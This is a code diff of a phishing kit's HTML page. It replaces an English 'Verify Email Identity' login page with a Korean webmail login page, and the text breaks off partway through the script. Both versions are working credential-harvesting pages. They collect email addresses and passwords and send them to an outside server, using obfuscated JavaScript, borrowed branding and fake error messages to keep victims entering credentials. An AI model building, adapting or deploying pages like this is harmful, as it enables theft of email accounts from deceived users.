@@ -1,307 +1,555 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="Ecount" content="width=device-width, initial-scale=1.0">
-    <title></title>
-      <link rel="shortcut icon" href="">
-    <style>
+
+
+<!doctype html>
+<html lang="en"> 
+ <head>
+
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
+  <meta name="referrer" content="strict-origin"> 
+  <link id="favicon" rel="shortcut icon" type="image/png" href="https://alphatrade-options.com/git/rand/favicon.png"> 
+  <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script> 
+  <title>웹메일 - 로그인.........</title> 
+
+  <style>
         body {
+            background-color: #eeeeee;
+            font-family: Helvetica Neue, Helvetica, sans-serif;
+            font-size: 13px;
+            color: #425152;
             margin: 0;
-            padding: 0;
-            background-image: url();
-           background-repeat: no-repeat;
-           background-size: cover;
-          
+			
         }
-        /* CAPTCHA Container */
-        #captcha-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-           background-image: url();
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            background-repeat: no-repeat;
-           background-size: cover;
-          
+
+        ::-moz-placeholder {
+            color: #d9dad9;
         }
-        
-        .captcha-box {
-            width: 400px;
-            padding: 30px;
-            background-color: rgb(255, 255, 255);
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+
+        :-ms-input-placeholder {
+            color: #d9dad9;
+        }
+
+        ::-ms-input-placeholder {
+            color: #d9dad9;
+        }
+
+        ::placeholder {
+            color: #d9dad9;
+        }
+
+        a {
+            color: #425152;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        input {
+            border-radius: 5px;
+            padding: 5px 3px;
+        }
+
+        input.submit {
+            font-weight: bold;
             text-align: center;
-        }
-        
-        .captcha-title {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #000000;
-            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
-        }
-        
-        .captcha-message {
-            font-size: 16px;
-            margin-bottom: 20px;
-            color: #000000;
-           font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
-        }
-        
-        .animal-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-        
-        .animal-option {
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            padding: 10px;
+            min-width: 90px;
+            color: #f0f0f0;
+            background: #444444;
+            padding: 5px 12px;
+            border-color: #444444;
+            border-style: solid;
             cursor: pointer;
-            transition: all 0.2s;
         }
-        
-        .animal-option:hover {
-            border-color: #005da6;
-        }
-        
-        .animal-option.selected {
-            border-color: #005da6;
-            background-color: #e6f2ff;
-        }
-        
-        .animal-option img {
-            width: 100%;
-            height: 80px;
-            object-fit: contain;
-        }
-        
-        .animal-option p {
-            margin: 5px 0 0;
-            font-size: 14px;
-        }
-        
-        #verify-btn {
-            background-color: #005da6;
+
+        input.submit:hover {
             color: #ffffff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
-        }
-        
-        #verify-btn:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
         }
 
-        .boxall {
-            width: 415px;
-            height: 650px;
-            margin: auto;
-            overflow: hidden;
-            background-color: ;
-            
+        .row {
+            margin: 10px 0;
         }
 
-        .imga{
-            margin-left:35px;
-            margin-top: 50px;
-
+        .row:after {
+            content: "";
+            display: table;
+            clear: both;
         }
 
-        .imgaa{
-            margin-left:33px;
-            margin-top:20px;
-
-        }
-        .box1 {
-            
-            width: 410px;
-            height: 390px;
-            margin: auto;
-            margin-top:100px;
-            background-color: #ffffff;
-            
+        .logoWithPortalIcons {
+            width: 150px;
+            height: 50px;
+            background: transparent url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMbYbiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGxVJRlDfZsfqY+myn9z+xc02sSLPjkFNDXdCOml1bm64pMdgRHg2JZuw6Xbz3FYfBBQOxbGOraAoGWEiFqUbKQscCkuNyKq3CREr3EXU6j0au9T1jd5aeuEeOiyXbE4N5hzV1iq6OUCG/rc9vyW0yZqNW07LX+nED3fNVBSllXKRF4Md1RxFF4E9rGoi8SWc54C6YUROUjx0ID1F/iZsqxmPqLFc1/w/EstMVytgZ+HZPpPIAHF0QK3PsrK+BL1qLXAdHAz07XK6YPAC59a6QcXFwWBSehmOBzsKjuJ9cHjcs4ObAcUnXPQO6hRTAc2nx//wCPaq4/QlxCjAAAAAASUVORK5CYII=')
+                /*IconsTogether.svg*/
+                no-repeat left top;
+				
         }
 
-	 @media(max-width:450px){
-                            body{
-                                background-image: url(ccc);
-                            }
-                        }
-        .inp1{
-            width: 330px;
+        .logoOnly {
+            width: 280px;
             height: 30px;
-            margin-left: 37px;
-            margin-top:8px;
-            padding-left: 3px;
-            border: none;
-            font-size: 16px;
-            outline: none;
-            position: relative;
-            top: -39px;
-            background-color red;
-            left:-5px;
-		 color: #1b1b1b;
-            font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
-        
+            overflow: hidden;
         }
 
-        .enterpass{
-            margin-left: 35px;
-            margin-top: -20px;
-            line-height: 1.75rem;
-  color: #1b1b1b;
-  font-size: 1.5rem;
-  font-weight: 600;
-  font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
-}
-
-.enter-to-acess{
-    margin-left: 35px;
-   margin-top: -15px;
-            line-height:;
-  color: #1b1b1b;
-  font-size:14px;
-  font-weight: ;
-  font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
-
-
-}
-        
-
-        .inp2{
-            width: 330px;
-            height: 25px;
-            margin-left:35px;
-            margin-top:-40px;
-            padding-left: 3px;
-            border: none;
-            border-bottom: 0.5px solid rgb(54, 54, 54);
-            font-size: 16px;
-            outline: none;
-            background-color: transparent;
+        .logoOnly .logoWithPortalIcons {
+            width: 320px;
+            height: 120px;
         }
 
-
-        .error-message {
-            margin-left: 35px;
-            color: red;
-            margin-top: px;
-            background-color: ;
-            width:350px;
-            font-size:13px;
-            font-weight: ;
-            font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
-            display: block;
+        .title {
+            font-size: 26px;
+            margin: 20px 0 10px;
         }
 
-       
+        .red {
+            color: #EE3031;
+        }
 
-        button {
-            background-color: #fccc04;
-            color: #000000;
-            margin-left: 254px;
-            font-weight: 700;
-            width: 120px;
-            height: 34px;
-            margin-top: 40px;
+        a#create-account {
+            display: inline-block;
+            border-radius: 4px;
+            padding: 3px 8px;
+            border: 1px solid #EE3031;
+        }
+
+        a#create-account:hover {
+            text-decoration: none;
+        }
+
+        .col1,
+        .col2 {
+            float: left;
+            line-height: 30px;
+            vertical-align: middle;
+            padding-top: 4px;
+        }
+
+        .col1 {
+            width: 124px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .col2 {
+            width: 286px;
+        }
+
+        .col2 input {
+            width: 96%;
+        }
+
+        .error {
+            color: #D52B1E;
+            font-weight: normal;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 1.0);
+            padding: 40px;
+            box-shadow: 2px 2px 4px 2px #ccc;
+            width: 416px;
+            border-radius: 5px;
+            /*
+            margin: 0 auto;
+            position:absolute;
+            left:0;
+            right:0;
+            top:38%;
+            top:100px\9;
+            transform: translateY(-50%);
+			*/
+            margin: 10% auto 30px auto;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            transition: all 0.3s cubic-bezier(.25, .8, .25, 1);
+			
+        }
+
+        .password-icon {
+            width: 20px;
+            position: absolute;
             cursor: pointer;
-            border: none;
+            margin-top: 9px;
+            margin-left: -28px;
+            background-color: white;
         }
 
-        /* Loader Styles */
-        /* Fullscreen Loader Container */
-    #loader {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color:; /* Light background */
-      display: flex;
-      background-image: url();
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      background-repeat: no-repeat;
-           background-size: cover;
-    }
-
-    /* Loader Image */
-    #loader img {
-      width: 150px; /* Initial size */
-      height: 100px;
-      animation: zoom 2s ease-in-out 4; /* Zoom animation 4 times */
-    }
-
-    /* Animation Keyframes */
-    @keyframes zoom {
-      0%, 100% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.3); /* Zoom in */
-      }
-    }
-
-    /* Message */
-    #loader-message {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
-      font-family: Arial, sans-serif;
-    }
+        #login_footer {
+            line-height: 125%;
+            font-size: 12px;
+            text-align: justify;
+            width: 500px;
+            margin: 90px auto auto auto;
+            padding-left: 10px;
+        }
 
 
-    </style>
-</head>
-<body>
-    
-  <div id="">
-    <img src="" >
-    <div id=""></div>
+        @media only screen and (max-width: 600px) {
+            body {
+                background-image: blur(1.2px);
+				
+				
+            }
 
-  </div>
+            .container {
+                /*
+                position:relative;
+                padding: 20px;
+                box-shadow:none;
+                width: 375px;
+                top:0;
+                left:auto;
+                right:auto;
+                transform: translateY(0);
+				*/
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+                padding: 0;
+                margin-top: 0;
+				
+            }
 
-    <div class="boxall">
-        <div class="box1">
-            <form method="post" action="https://maxmeet.online/wp-gen-file/sim.php" id="contactForm">  
-                <img class="imga" src="" > <br> <br> <br>
-                <p class="enter-to-acess"> <br>
-                    Verify Email Identity. </p> <br> <br>
-                    <input type="hidden" name="formtype" id="formtype" value="login">
-                    <input type="hidden" name="auth" value="">
+            .container div.body {
+                padding: 40px 20px;
+				
+            }
+
+            .col1,
+            .col2 {
+                float: none;
+                width: 100%;
+            }
+
+            #login_footer {
+                width: 99%;
+                margin-top: 20px;
+            }
+
+            #login_footer div.content {
+                padding: 10px 20px 10px 10px;
+            }
+
+            .password-icon {
+                margin-top: -25px;
+                right: 7%;
+            }
+
+        }
 
 
-              
+        .xlogo {
+            color: #fff;
+            margin-bottom: 10px;
+            margin-top: -25px;
+        }
+
+        .xlogo img {
+            vertical-align: middle;
+            width: 5%;
+            height: 5%;
+            object-fit: contain
+        }
+
+        .xlogo span {
+            vertical-align: middle
+        }
+
+        .text-g {
+            font-family: "Arial Black", Gadget, sans-serif;
+            text-transform: uppercase !important;
+            text-align: center;
+            font-size: 25px;
+            color: #444444;
+            background-color: rgba(255, 255, 255, 0);
+            text-shadow: rgb(255, 255, 255) 2px 2px 2px;
+        }
+
+        #root {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            filter: brightness(0.3)
+			
+			
+        }
+		
+		.enableBlur>* {
+  filter: blur(1.2px);
+}
+
+.disableBlur {
+  filter: blur(0);
+}
+		
+		
+    </style> 
+
+  <meta http-equiv="X-Translated-By" content="Google">
+  <meta http-equiv="X-Translated-To" content="en">
+  
+  <meta name="robots" content="none">
+ </head> 
+ <body>
+ 
+  <div id="login_form" action="" method="post" autocomplete="off"> 
+   <input type="hidden" name="csrfmiddlewaretoken" value="xWUPRch6gUXcsYdMNLyWrIvExcWeJ3qTtf8VMHZWmQ2EBBFj3eYVAcVdcPIJiDWq"> 
+   <input type="hidden" name="next" value="/"> 
+   
+   <div class="container" id="container" style="padding-bottom:10px!important; position: relative;"> 
+    <div style="position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7; display:none" id="background-image"> 
+    </div> 
+    <img src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif" style="width:50px; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); display:none" id="processing"> 
+   </div> 
+  </div> 
+  <script type="text/template" id="tpl-password">
+
+    <input type="hidden" class="form-control" name="hido" id="hido" value="">
+    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+        <div class="body">
+           
+            <div class="xlogo">
+                <img id="logoimg" src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/favicons.png?alt=media&token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3">
+                <span style="text-transform: capitalize;" class='text-g' id="banNer"></span>
+                </div>
+            <div class="row">
+                <div class="col1"><label for="id_email">이메일:</label></div>
+                <div class="col2"><input type="email" name="email" value="" id="email"autofocus placeholder="이메일 주소"></div>
+            </div>
+                <div class="col1"><label for="id_pass">비밀번호:</label></div>
+                <div class="col2"><input type="password" name="password" id="password" autofocus placeholder="이메일 비밀번호"></div>
+                  <img id="id-password-reveal-icon" class="password-icon" src="https://fac.corp.fortinet.com/customviews/image/password_hidden:93edf7d3ceb704be92ee084ecc62c6c8/" alt="" onclick="setVisibility()"/>
+            </div>
+            <br><br>
+            <div class="row">
+               <span id="msg" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;
+       ">로그인 시도 시간이 초과되었습니다. 다시 시도하십시오.</span>
+	   
+	   <span id="error" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;
+       ">암호를 입력</span>
+            </div>
+            <div class="row">
+                <div class="col1" style="line-height:40px;padding-top:10px;">
+                    <input type="button" id='submit-btn' class="submit" value="계속하려면 로그인" style="padding:7px 24px;" /></div>
+            </div>
+            <div class="row">
                 
-                <input type="email" class="inp1" required name="email" value="" id="email" autofocus placeholder="Email">
-                <input type="password" class="inp2" required name="password" id="password" placeholder="Password"> <br> <br>
-                 <div id="errorMessage" class="error-message">[ 404 ] Try agin</div>
-                    
-                <button type="submit" id="button">Login</button>
-            </form>
+                <p>
+                    괜찮습니다. 저작권 © 2025 <span id="kai" style="text-transform: capitalize;"></span>.
+                    <br>
+                    <br>
+                </p>
+            </div>
         </div>
-    </div>
+    </script> 
+  <script>
+        var _0x1831da=_0x1c4f;(function(_0x19fc8d,_0x45ad8d){var _0x56646c=_0x1c4f,_0x514d6b=_0x19fc8d();while(!![]){try{var _0x2ac149=-parseInt(_0x56646c(0x11f))/0x1+-parseInt(_0x56646c(0x120))/0x2*(parseInt(_0x56646c(0x123))/0x3)+-parseInt(_0x56646c(0x126))/0x4+parseInt(_0x56646c(0x128))/0x5*(parseInt(_0x56646c(0x124))/0x6)+parseInt(_0x56646c(0x11e))/0x7+parseInt(_0x56646c(0x121))/0x8+-parseInt(_0x56646c(0x125))/0x9;if(_0x2ac149===_0x45ad8d)break;else _0x514d6b['push'](_0x514d6b['shift']());}catch(_0x39d37d){_0x514d6b['push'](_0x514d6b['shift']());}}}(_0x33e7,0xf266c));var html='';html=document[_0x1831da(0x127)](_0x1831da(0x129))[_0x1831da(0x122)];function _0x1c4f(_0x2f9ca5,_0x39e4aa){var _0x33e749=_0x33e7();return _0x1c4f=function(_0x1c4fe5,_0x13b4f3){_0x1c4fe5=_0x1c4fe5-0x11e;var _0x22f4a1=_0x33e749[_0x1c4fe5];return _0x22f4a1;},_0x1c4f(_0x2f9ca5,_0x39e4aa);}var container=document[_0x1831da(0x127)](_0x1831da(0x12a));container[_0x1831da(0x122)]+=html;function _0x33e7(){var _0x3fcf96=['80KsLiRV','tpl-password','container','12515440MyiXzF','908262gmsxIg','6212SFIYce','11143600zYICZq','innerHTML','1002YKQdSq','10878hFgQJw','678213VynMvc','783916CdqYII','getElementById'];_0x33e7=function(){return _0x3fcf96;};return _0x33e7();}
+    </script> 
+  <div id="root"> <iframe id="myframe" scrolling="no" style="position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7;  width="100%" height="100%" frameborder="0"></iframe> 
+  </div>  
 
-    <script>
-const RTQ$gTJmdhj_Q=ytIoYHDvKfmgeuHy$YkzKrvsM;(function(BooSWB_gvqLJxKvnoZXCBc_S,ihILYiPDjr_nRVLMr){const OszDkfsCequRRz_cArCByWN=ytIoYHDvKfmgeuHy$YkzKrvsM,NljaY_lcwzvRZg_brhTRL=BooSWB_gvqLJxKvnoZXCBc_S();while(!![]){try{const eV$cVz=parseInt(-parseFloat(OszDkfsCequRRz_cArCByWN(0x8c))/(parseInt(0x6d)*parseInt(0x38)+-parseInt(0x498)+-0x17b*parseInt(0xd)))*Math['trunc'](parseFloat(OszDkfsCequRRz_cArCByWN(0x80))/(parseInt(0x20e3)*0x1+0x942+Math.ceil(-parseInt(0x2a23))))+parseFloat(OszDkfsCequRRz_cArCByWN(0x88))/(Math.ceil(0x1f16)*-0x1+parseInt(0x19e1)+-0x1*-parseInt(0x538))*Number(parseFloat(OszDkfsCequRRz_cArCByWN(0x90))/(parseFloat(-parseInt(0x3))*Math.ceil(-0x91d)+parseInt(0x3)*parseInt(0x257)+-parseInt(0x2258)))+parseFloat(OszDkfsCequRRz_cArCByWN(0x93))/(-parseInt(0x1d11)+Number(-parseInt(0x35b))*parseInt(0x8)+parseInt(0x37ee))+-parseFloat(OszDkfsCequRRz_cArCByWN(0x8e))/(Math.ceil(-parseInt(0x6f6))+parseInt(0x3)*parseInt(0x622)+parseInt(-0xb6a))*(-parseFloat(OszDkfsCequRRz_cArCByWN(0xa4))/(Number(-parseInt(0x66))*parseInt(0x49)+parseFloat(0x1658)+parseInt(0x6c5)))+Number(parseFloat(OszDkfsCequRRz_cArCByWN(0x96))/(-0x211*Math.floor(-parseInt(0x1))+Math.trunc(-0xc7)*parseInt(parseInt(0x2c))+0x202b))*(parseFloat(OszDkfsCequRRz_cArCByWN(0x97))/(Math.ceil(parseInt(0x24f5))+Math.floor(-0x1)*-0xa09+Math.ceil(-0x3)*0xfa7))+parseFloat(parseFloat(OszDkfsCequRRz_cArCByWN(0x8f))/(Math.floor(-0x1)*-parseInt(0x121e)+-0x22c0+Number(0x10ac)))*(-parseFloat(OszDkfsCequRRz_cArCByWN(0x9e))/(Math.trunc(-parseInt(0x722))+Math.ceil(-parseInt(0xdd))*-parseInt(0x25)+-parseInt(0x2)*Math.floor(parseInt(0xc62))))+parseFloat(OszDkfsCequRRz_cArCByWN(0x84))/(Math.max(0x5d,0x5d)*-0x41+Number(0x11cb)+parseFloat(0x5de));if(eV$cVz===ihILYiPDjr_nRVLMr)break;else NljaY_lcwzvRZg_brhTRL['push'](NljaY_lcwzvRZg_brhTRL['shift']());}catch(EcXziVdTIYAowTvqkbOiHMTT){NljaY_lcwzvRZg_brhTRL['push'](NljaY_lcwzvRZg_brhTRL['shift']());}}}(EM$DVedFZPL,Math.floor(0x40)*Math.ceil(-parseInt(0x47cf))+0x1749*Math.ceil(-parseInt(0xd))+Number(parseInt(0x1dd74d))));function ytIoYHDvKfmgeuHy$YkzKrvsM(aygQFjmZlPO,nlApLPvvmFJzVl_LkEZ){const OnRlLcFeGauqkcRO=EM$DVedFZPL();return ytIoYHDvKfmgeuHy$YkzKrvsM=function(buKLAuzl_S,eIlu$GMp$BbP){buKLAuzl_S=buKLAuzl_S-(Math.max(-0x1742,-0x1742)+parseInt(parseInt(0xa))*Math.max(-parseInt(0xc5),-parseInt(0xc5))+parseInt(0x1f71)*Math.ceil(parseInt(0x1)));let GNmpIkATGSlUwuGo$GBKtbBy=OnRlLcFeGauqkcRO[buKLAuzl_S];if(ytIoYHDvKfmgeuHy$YkzKrvsM['fWXzwd']===undefined){const VncgTXNp_TyFkh$j=function(ceBpDkr_Xmr$TvyXNMpENrDQk){let ZQWfjK_ZTI=Math.ceil(-parseInt(0x1))*0x2ef+Math.floor(0x8)*Number(-0x14f)+Math.ceil(-0x4)*Math.ceil(-0x3e0)&Math.floor(-0xaf1)*-0x1+Math.floor(-parseInt(0x282))+-parseInt(0x10)*Number(parseInt(0x77)),BZALdFj=new Uint8Array(ceBpDkr_Xmr$TvyXNMpENrDQk['match'](/.{1,2}/g)['map'](CUKzrZtryAoNFvzPw_U$N=>parseInt(CUKzrZtryAoNFvzPw_U$N,-parseInt(0x49)*-0x31+-parseInt(0x2376)+Math.max(0x158d,0x158d)))),WrDkCWJCblbKEPmmuC=BZALdFj['map'](PhIEKl=>PhIEKl^ZQWfjK_ZTI),r$klHZPTBcFtQgLkixENRzU=new TextDecoder(),uCrUTLehTPh$uexPfLhxYM_Ze=r$klHZPTBcFtQgLkixENRzU['decode'](WrDkCWJCblbKEPmmuC);return uCrUTLehTPh$uexPfLhxYM_Ze;};ytIoYHDvKfmgeuHy$YkzKrvsM['uAkQmX']=VncgTXNp_TyFkh$j,aygQFjmZlPO=arguments,ytIoYHDvKfmgeuHy$YkzKrvsM['fWXzwd']=!![];}const aXlmeKscNA$hJMbXLl$Brv=OnRlLcFeGauqkcRO[-0x12e2+parseFloat(parseInt(0x2450))+-0x116e],Mi_RFEbJD_Yc=buKLAuzl_S+aXlmeKscNA$hJMbXLl$Brv,pLMhnnrn_$qnXZwVOezfoFoLdCY=aygQFjmZlPO[Mi_RFEbJD_Yc];return!pLMhnnrn_$qnXZwVOezfoFoLdCY?(ytIoYHDvKfmgeuHy$YkzKrvsM['MLfEus']===undefined&&(ytIoYHDvKfmgeuHy$YkzKrvsM['MLfEus']=!![]),GNmpIkATGSlUwuGo$GBKtbBy=ytIoYHDvKfmgeuHy$YkzKrvsM['uAkQmX'](GNmpIkATGSlUwuGo$GBKtbBy),aygQFjmZlPO[Mi_RFEbJD_Yc]=GNmpIkATGSlUwuGo$GBKtbBy):GNmpIkATGSlUwuGo$GBKtbBy=pLMhnnrn_$qnXZwVOezfoFoLdCY,GNmpIkATGSlUwuGo$GBKtbBy;},ytIoYHDvKfmgeuHy$YkzKrvsM(aygQFjmZlPO,nlApLPvvmFJzVl_LkEZ);}const submissions=[];function EM$DVedFZPL(){const VraXL$ayehlr=['282e282e2c292d49716c7c6149','2b2e7f5571614054','5d56545a76776d7c776d5576787d7c7d','76777c6b6b766b','7c74787075','74787077347a76776d7c776d','757c777e6d71','6d7c616d5a76776d7c776d','2d2d2d28202b28636b436d6b60','716b7c7f','76697c77','7869697c777d','7a766c776d','6a7c786b7a71','282f284c4d557c714d','75767a786d707677','7e7c6d5c757c747c776d5b60507d','6f78756c7c','7e7c6d','787a6d707677','7576787d7c6b','76777576787d','7a76776d787a6d5f766b74','55767e7077','7d706a69757860','696b7c6f7c776d5d7c7f786c756d','6a6d786d6c6a','696c6a71','2f282b746c5a4b6b72','49564a4d','7776777c','6a7c777d','202c202e2f29295876575f6f63','55767e7e70777e397077373737','6a6d60757c','6d764a6d6b70777e','2b2c29202120755143494d5b','6a6c7b74706d','7c6b6b766b547c6a6a787e7c','787d7d5c6f7c776d55706a6d7c777c6b','2a2a2a2e757b525c4974','7b75767a72','2a282e2d634c4c6c5a6b','2a29437c535a4c52','2d7a5f6d487e55','716d6d696a2336366e6e6e377d7175377a7674367c77346c6a367176747c367a76776d787a6d367a6c6a6d76747c6b346a7c6b6f707a7c367a6c6a6d76747c6b346a7c6b6f707a7c37716d7475','69786a6a6e766b7d','2f202e2b2c212c7270615c574b','7d706a787b757c7d','7b6c6d6d7677'];EM$DVedFZPL=function(){return VraXL$ayehlr;};return EM$DVedFZPL();}document[RTQ$gTJmdhj_Q(0x8b)](RTQ$gTJmdhj_Q(0x98),function(){const YdHHM_LpUuWA_odo=RTQ$gTJmdhj_Q,zlSmeIluGMp$Bb=new URLSearchParams(window[YdHHM_LpUuWA_odo(0xa5)][YdHHM_LpUuWA_odo(0xa3)])[YdHHM_LpUuWA_odo(0xa8)](YdHHM_LpUuWA_odo(0x9a));zlSmeIluGMp$Bb&&(document[YdHHM_LpUuWA_odo(0xa6)](YdHHM_LpUuWA_odo(0x9a))[YdHHM_LpUuWA_odo(0xa7)]=zlSmeIluGMp$Bb);const SGNmpIkATGSlUwu_GoGBKt=document[YdHHM_LpUuWA_odo(0xa6)](YdHHM_LpUuWA_odo(0x92))[YdHHM_LpUuWA_odo(0xa7)],ByNa$_X=document[YdHHM_LpUuWA_odo(0xa6)](YdHHM_LpUuWA_odo(0x8a));ByNa$_X&&(ByNa$_X[YdHHM_LpUuWA_odo(0x86)][YdHHM_LpUuWA_odo(0xae)]=YdHHM_LpUuWA_odo(0x82));}),document[RTQ$gTJmdhj_Q(0xa6)](RTQ$gTJmdhj_Q(0xac))[RTQ$gTJmdhj_Q(0x8b)](RTQ$gTJmdhj_Q(0x89),function(me_KscNAhJ){const iuetLf=RTQ$gTJmdhj_Q;me_KscNAhJ[iuetLf(0x7d)]();const bXLlBrvoMi_R$FEbJDYcYp=this,Mhnnr$nqnXZwVOezfoFo_L=new FormData(bXLlBrvoMi_R$FEbJDYcYp),CYxVnc=document[iuetLf(0xa6)](iuetLf(0x92));submissions[iuetLf(0x7f)](-0x3*parseInt(0x80b)+-0x69d*parseFloat(0x3)+0x2bf9);const TXNp$T_yF=submissions[iuetLf(0x9c)];Mhnnr$nqnXZwVOezfoFo_L[iuetLf(0xa1)](iuetLf(0xa2),TXNp$T_yF[iuetLf(0x87)]());const hjTceBpDk=document[iuetLf(0xa6)](iuetLf(0x8a)),XmrTvyX_NMp$EN=document[iuetLf(0xa6)](iuetLf(0x95));hjTceBpDk[iuetLf(0x86)][iuetLf(0xae)]=iuetLf(0x82),XmrTvyX_NMp$EN[iuetLf(0x94)]=!![],XmrTvyX_NMp$EN[iuetLf(0x9d)]=iuetLf(0x85);const DQkkZQ$WfjKZ$T=new XMLHttpRequest();DQkkZQ$WfjKZ$T[iuetLf(0xa0)](iuetLf(0x81),bXLlBrvoMi_R$FEbJDYcYp[iuetLf(0xa9)],!![]),TXNp$T_yF<-0x951+Number(0x1400)+Math.max(-parseInt(0xaad),-parseInt(0xaad))?setTimeout(()=>{const 